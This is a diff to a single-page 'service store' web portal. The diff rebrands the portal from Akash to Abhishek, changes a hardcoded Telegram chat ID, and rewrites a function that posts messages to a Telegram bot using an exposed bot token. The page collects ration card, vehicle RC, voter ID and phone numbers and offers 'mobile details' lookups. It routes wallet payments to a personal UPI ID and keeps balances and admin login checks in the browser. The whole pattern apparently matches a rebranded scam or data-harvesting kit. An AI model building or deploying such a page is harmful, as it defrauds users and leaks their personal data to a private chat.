@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Akash All-In-One Multi Service Portal</title>
+  <title>Abhishek All-In-One Multi Service Portal</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Arial, sans-serif; }
     body { background: #f0f2f5; padding: 15px; }
@@ -19,6 +19,15 @@
       margin-bottom: 20px; 
       flex-wrap: wrap;
       gap: 10px;
+    }
+
+    .brand-title {
+      font-size: 22px;
+      font-weight: 900;
+      font-family: 'Georgia', 'Arial Black', serif;
+      color: #ff3333;
+      text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.4);
+      letter-spacing: 1px;
     }
 
     .header-right {
@@ -156,7 +165,7 @@
   </div>
 
   <header>
-    <h2>Akash Service Store</h2>
+    <div class="brand-title">Abhishek Service Store</div>
 
     <div class="header-right">
       <div class="user-info-badge" id="top-corner-info">
@@ -450,9 +459,8 @@
   </div>
 
   <script>
-    // UPDATED CONFIG WITH YOUR NEW CHAT ID
     const BOT_TOKEN = "7060236112:AAFSZSgRdoegdb4e_8FJ9s4h0BtGkgEwE1s";
-    const CHAT_ID = "742143795"; 
+    const CHAT_ID = "6318395817"; 
     const TARGET_UPI = "laxmihi@ptyes";
 
     const commissionRates = { Jio: 2.0, Airtel: 1.5, Vi: 2.5 };
@@ -478,23 +486,34 @@
     let usersDB = JSON.parse(localStorage.getItem("usersDB")) || [];
     let currentUser = JSON.parse(localStorage.getItem("currentUser")) || null;
 
-    // GUARANTEED FAST TELEGRAM NOTIFICATION FUNCTION
     function sendTelegramAlert(textMsg) {
-      const encodedText = encodeURIComponent(textMsg);
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedText}&parse_mode=Markdown`;
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
       
-      const img = new Image();
-      img.src = url;
+      fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: textMsg,
+          parse_mode: 'Markdown'
+        })
+      })
+      .then(res => res.json())
+      .then(data => {
+        console.log("Telegram Success:", data);
+      })
+      .catch(err => console.error("Telegram Network Error:", err));
     }
 
-    // DYNAMIC QR CODE GENERATOR
     function generateUpiQR() {
       const amt = document.getElementById("add-amt").value;
       const qrWrapper = document.getElementById("qr-wrapper");
       const qrImg = document.getElementById("upi-qr-code");
 
       if(amt && amt > 0) {
-        const upiString = `upi://pay?pa=${TARGET_UPI}&pn=AkashServiceStore&am=${amt}&cu=INR`;
+        const upiString = `upi://pay?pa=${TARGET_UPI}&pn=AbhishekServiceStore&am=${amt}&cu=INR`;
         qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(upiString)}`;
         qrWrapper.style.display = "block";
       } else {
@@ -511,7 +530,7 @@
       }
 
       const note = encodeURIComponent("Wallet Add Money");
-      const name = encodeURIComponent("Akash Service Store");
+      const name = encodeURIComponent("Abhishek Service Store");
       let upiUrl = `upi://pay?pa=${TARGET_UPI}&pn=${name}&am=${amt}&cu=INR&tn=${note}`;
 
       if(app === 'phonepe') {
@@ -527,7 +546,7 @@
 
     function testTelegramMessage() {
       alert("Testing Telegram Connection...");
-      sendTelegramAlert("🧪 *TEST MESSAGE*\n\nNayi Chat ID ke saath Telegram alerts active hain!");
+      sendTelegramAlert("🧪 *TEST MESSAGE*\n\nAbhishek Service Store connected successfully!");
       alert("Check Telegram Bot!");
     }
 
@@ -641,7 +660,6 @@
       document.getElementById("qr-wrapper").style.display = "none";
     }
 
-    // ALL SERVICES COMMON TRIGGER FUNCTION
     function createServiceOrder(type, details, charge) {
       if(currentUser.balance < charge) { 
         alert(`Wallet Balance Kam Hai! Request ke liye ₹${charge} Add Karein.`); 
@@ -673,7 +691,6 @@
       return true;
     }
 
-    // 1. MOBILE DETAILS SERVICE
     function getMobileDetails() {
       const mob = document.getElementById("mob-detail-number").value;
       if(!mob || mob.length !== 10) { alert("Valid 10-Digit Mobile Number Enter Karein!"); return; }
@@ -684,7 +701,6 @@
       }
     }
 
-    // 2. RATION CARD PDF SERVICE
     function getRationPdf() {
       const rationNo = document.getElementById("ration-number").value;
       const mob = document.getElementById("ration-mobile").value;
@@ -697,7 +713,6 @@
       }
     }
 
-    // 3. VEHICLE RC PDF SERVICE
     function getRcPdf() {
       const rcNo = document.getElementById("rc-number").value.toUpperCase();
       const mob = document.getElementById("rc-mobile").value;
@@ -710,7 +725,6 @@
       }
     }
 
-    // 4. VOTER ID MOBILE LINKING
     function linkVoterMobile() {
       const voterNo = document.getElementById("voter-number").value.toUpperCase();
       const mob = document.getElementById("voter-mobile").value;
@@ -723,7 +737,6 @@
       }
     }
 
-    // 5. MOBILE RECHARGE
     function buyPlan() {
       const num = document.getElementById("buy-number").value;
       const op = document.getElementById("buy-operator").value;
@@ -739,7 +752,6 @@
       }
     }
 
-    // 6. GOOGLE PLAY CODE
     function buyGooglePlayCode() {
       const mob = document.getElementById("gplay-mobile").value;
       const amt = Number(document.getElementById("gplay-amt").value);
@@ -753,7 +765,6 @@
       }
     }
 
-    // 7. AMAZON GIFT VOUCHER
     function buyAmazonGiftCard() {
       const contact = document.getElementById("amz-contact").value;
       const amt = Number(document.getElementById("amz-amt").value);
@@ -766,7 +777,6 @@
       }
     }
 
-    // 8. ELECTRICITY BILL
     function payUppclBill() {
       const discom = document.getElementById("uppcl-discom").value;
       const acc = document.getElementById("uppcl-acc").value;
@@ -782,8 +792,6 @@
         document.getElementById("uppcl-amt").value = "";
       }
     }
-
-    /* --- ADMIN PANEL FUNCTIONS --- */
 
     function loginAdmin() {
       const u = document.getElementById("admin-user").value;
